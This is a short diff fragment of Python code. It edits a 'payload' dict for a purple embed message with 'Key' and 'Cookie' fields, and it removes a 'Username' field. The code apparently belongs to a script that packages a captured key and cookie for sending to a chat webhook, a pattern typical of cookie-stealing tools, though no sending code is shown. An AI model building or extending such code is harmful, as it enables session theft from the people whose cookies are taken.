@@ -1646,7 +1646,6 @@ payload = {
             "color": 0x6B3DFF,  # Purple color (hex code)
             "fields": [
                 {"name": "Key", "value": key},
-		{"name": "Username", "value": username},
                 {"name": "Cookie", "value": cookie}
             ]
         }
